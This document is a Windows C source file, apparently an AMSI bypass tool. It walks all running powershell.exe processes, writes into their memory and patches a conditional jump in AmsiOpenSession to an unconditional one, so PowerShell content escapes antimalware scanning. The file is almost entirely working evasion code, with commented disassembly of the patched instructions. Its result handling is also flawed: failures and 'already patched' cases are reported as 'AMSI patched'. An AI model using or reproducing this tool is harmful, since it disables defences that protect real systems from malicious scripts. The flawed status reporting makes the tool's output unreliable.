#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

//00007FFAE957C650 | 48:85D2 | test rdx, rdx |
//00007FFAE957C653 | 74 3F | je amsi.7FFAE957C694 |
//00007FFAE957C655 | 48 : 85C9 | test rcx, rcx |
//00007FFAE957C658 | 74 3A | je amsi.7FFAE957C694 |
//00007FFAE957C65A | 48 : 8379 08 00 | cmp qword ptr ds : [rcx + 8] , 0 |
//00007FFAE957C65F | 74 33 | je amsi.7FFAE957C694 |

char patch[] = { 0xEB };

int onemessage = 1;

int
searchPattern(
	BYTE* startAddress,
	DWORD searchSize,
	BYTE* pattern,
	DWORD patternSize)
{
	DWORD i = 0;

	while (i < 1024) {

		if (startAddress[i] == pattern[0]) {
			DWORD j = 1;
			while (j < patternSize && i + j < searchSize && (pattern[j] == '?' || startAddress[i + j] == pattern[j])) {
				j++;
			}
			if (j == patternSize) {
				return (i + 3);
			}
		}
		i++;
	}
	return (i);
}

int patchAmsi(DWORD tpid)
{
	BYTE pattern[] = { 0x48,'?','?', 0x74,'?',0x48,'?' ,'?' ,0x74 };

	DWORD patternSize = sizeof(pattern);

	if (!tpid)
		return (-1);

	HANDLE ProcessHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, 0, tpid);

	if (!ProcessHandle)
		return (-1);

	HMODULE hm = LoadLibraryA("amsi.dll");
	if (!hm)
		return(-1);

	PVOID AmsiAddr = GetProcAddress(hm, "AmsiOpenSession");

	if (!AmsiAddr)
		return(-1);

	unsigned char buff[1024];

	if (!ReadProcessMemory(ProcessHandle, AmsiAddr, &buff, 1024, (SIZE_T*)NULL))
		return (-1);

	int matchAddress = searchPattern(buff, sizeof(buff), pattern, patternSize);

	if (matchAddress == 1024)
		return (144);

	if (onemessage)
	{
		printf("AMSI address %X\n", AmsiAddr);

		printf("offset : %d\n", matchAddress);
		onemessage = 0;
	}
	unsigned long long int updateAmsiAdress = (unsigned long long int)AmsiAddr;

	updateAmsiAdress += matchAddress;

	if (!WriteProcessMemory(ProcessHandle, (PVOID)updateAmsiAdress, patch, 1, 0))
		return (-1);

}

void
PatchAllPowershells(
	const char *pn)
{
	int result   = 0;
	DWORD procId = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 pE;
		pE.dwSize = sizeof(pE);

		if (Process32First(hSnap, &pE))
		{
			if (!pE.th32ProcessID)
				Process32Next(hSnap, &pE);
			do
			{
				if (!_stricmp(pE.szExeFile, pn))
				{
					procId = pE.th32ProcessID;

					if (result = patchAmsi(procId))
						printf("AMSI patched %d\n", pE.th32ProcessID);
					else if (result == 144)
						printf("already patched \n");
					else
						printf("patch failed \n");
					
				}
			} while (Process32Next(hSnap, &pE));
		}
	}

	CloseHandle(hSnap);

	return ;
}


int
wmain() {

	PatchAllPowershells("powershell.exe");

	printf("AMSI patched in all powershells\n");

	system("pause");

	return (0);
}